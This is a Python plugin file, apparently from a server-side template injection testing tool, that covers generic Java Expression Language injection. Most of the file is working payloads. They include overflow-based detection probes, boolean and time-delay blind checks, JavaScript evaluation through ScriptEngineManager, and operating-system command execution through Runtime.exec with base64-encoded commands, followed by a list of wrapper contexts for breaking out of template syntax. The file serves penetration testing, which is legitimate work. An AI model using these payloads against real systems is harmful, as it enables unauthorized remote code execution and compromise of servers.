from plugins.languages import java
from utils import rand


class Java_EL_generic(java.Java):
    priority = 9
    plugin_info = {
        "Description": """Generic plugin for Expression Language (EL) injection in Java.""",
        "Usage notes": "This plugin can be used to speed up detection in simple contexts as well as for covering more of such engines.",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': """{code}""",
                'header': """({header[0]}+{header[1]})+''+(""",
                'trailer': """)+''+1*({trailer[0]}+{trailer[1]})+''""",
                'wrapper_type': "global",
                'test_render': f"""'{rand.randstrings[0]}'+1*((1).valueOf('2000000000')+2000000000)+'{rand.randstrings[1]}'""",
                'test_render_expected': f'{rand.randstrings[0]}-294967296{rand.randstrings[1]}'
            },
            'render_error': {
                'call': 'inject',
                'render': """{code}""",
                'header': """''.getClass().forName('java.lang.Integer').valueOf(({header[0]}+{header[1]})+''+(""",
                'trailer': """)+''+({trailer[0]}+{trailer[1]})+'ZZ')""",
                'wrapper_type': "global",
                'test_render': f"""'{rand.randstrings[0]}'+(''.getClass().forName('java.lang.Integer').valueOf('2000000000')+2000000000)+'{rand.randstrings[1]}'""",
                'test_render_expected': f'{rand.randstrings[0]}-294967296{rand.randstrings[1]}'
            },
            'boolean': {
                'call': 'inject',
                'test_bool_true':  "(''.getClass().forName('java.lang.Integer').valueOf('1')/((1000000000+1000000000==2000000000)?1:0)+'')",
                'test_bool_false': "(''.getClass().forName('java.lang.Integer').valueOf('1')/((1000000000+2000000000==1000000000)?1:0)+'')",
                'verify_bool_true':  "(''.getClass().forName('java.lang.Integer').valueOf('1')/((2000000000+2000000000==-294967296)?1:0)+'')",
                'verify_bool_false': "(''.getClass().forName('java.lang.Integer').valueOf('1')/((2000000000+2000000000==-224667999)?1:0)+'')"
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).toString()""",
                'test_eval': '"executed".replace("xecu", "valua")',
                'test_eval_expected': 'evaluated'
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """(''.getClass().forName('java.lang.Integer').valueOf('1')/((''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).equals(false))?1:0)+'')""",
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """((!''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).equals(false))?T(java.lang.Thread).sleep({delay}000):0).toString()""",
            },
            'execute': {
                'call': 'render',
                'execute': """''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).inputStream.readAllBytes())""",
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """(''.getClass().forName('java.lang.Integer').valueOf('1')/((''.getClass().forName('java.lang.Runtime').getRuntime().exec(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).waitFor()==0)?1:0)+'')""",
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """(''.getClass().forName('java.lang.Runtime').getRuntime().exec(''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.util.Base64').getDecoder().decode("{code_b64p}"))).waitFor().equals(0)?T(java.lang.Thread).sleep({delay}000):0).toString()""",
            }
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0, 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "#{{{code}}}", "@{{{code}}}", "*{{{code}}}",
                                      "{{={code}}}", "{{{{={code}}}}}", "\n={code}\n", "${{{code}}}", "<%={code}%>"]},
            {'level': 1, 'prefix': '{closure}+', 'suffix': '+{rclosure}', 'closures': java.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["{{{code}}}"], 'suffix': '{"1"',
             'closures': java.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{{code}}}}}"], 'suffix': '{{"1"',
             'closures': java.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["${{{code}}}"], 'suffix': '${"1"',
             'closures': java.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["#{{{code}}}"], 'suffix': '#{"1"',
             'closures': java.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["*{{{code}}}"], 'suffix': '*{"1"',
             'closures': java.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["@{{{code}}}"], 'suffix': '@{"1"',
             'closures': java.ctx_closures},
            {'level': 3, 'prefix': '{closure}%>', 'wrappers': ["<%={code}%>"], 'suffix': '<%="1"',
             'closures': java.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["{{={code}}}"], 'suffix': '{="1"',
             'closures': java.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{={code}}}}}"], 'suffix': '{{="1"',
             'closures': java.ctx_closures},
            {'level': 3, 'prefix': '{closure}\n', 'wrappers': ["\n={code}\n"], 'suffix': '\n="1"',
             'closures': java.ctx_closures},
            {'level': 3, 'prefix': '{closure}%}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}",
                                                                "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{%"1"',
             'closures': java.ctx_closures},
            # Comments
            {'level': 4, 'prefix': '*}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}", "#{{{code}}}",
                                                       "{{={code}}}", "{{{{={code}}}}}", "*{{{code}}}", "@{{{code}}}"],
             'suffix': '{*'},
            {'level': 4, 'prefix': '#}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}", "#{{{code}}}",
                                                       "{{={code}}}", "{{{{={code}}}}}", "*{{{code}}}", "@{{{code}}}"],
             'suffix': '{#'},
        ])

        self.language += ':script'
